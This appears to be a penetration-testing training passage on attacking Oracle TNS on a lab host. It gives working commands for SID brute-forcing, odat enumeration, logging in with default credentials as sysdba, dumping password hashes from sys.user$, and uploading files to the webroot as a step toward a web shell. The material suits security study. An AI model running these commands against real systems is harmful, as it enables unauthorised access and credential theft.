The `Oracle Transparent Network Substrate` (`TNS`) server is a communication protocol that facilitates communication between Oracle databases and applications over networks. Initially introduced as part of the [Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html) software suite, TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and `TCP/IP` protocol stacks.

```shell
sudo nmap -p1521 -sV 10.129.204.235 --open
```
We can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (`SID`) is a unique name that identifies a particular database instance.
When a client connects to an Oracle database, it specifies the database's `SID` along with its connection string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the `tnsnames.ora` file is used. There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like `nmap`, `hydra`, `odat`, and others. Let us use `nmap` first.
#### Nmap - SID Bruteforcing
```shell
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```
We can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components.
#### ODAT - enumerate the Oracle database services
```
odat all -s 10.129.204.235
```
In this example, we found valid credentials for the user `scott` and his password `tiger`. After that, we can use the tool `sqlplus` to connect to the Oracle database and interact with it.
If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`
```
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```
#### SQLplus - Log In
```shell
# sqlplus user/passwd@IP/XE
sqlplus scott/tiger@10.129.204.235/XE
```
#### Oracle RDBMS - Database Enumeration
```
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```
#### Oracle RDBMS - Extract Password Hashes
```
SQL> select name, password from sys.user$;
```

Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

| **OS**  | **Path**             |
| ------- | -------------------- |
| Linux   | `/var/www/html`      |
| Windows | `C:\inetpub\wwwroot` |
#### Oracle RDBMS - File Upload

```shell
echo "Oracle File Upload Test" > testing.txt
odat utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.
```shell
curl -X GET http://10.129.204.235/testing.txt
```

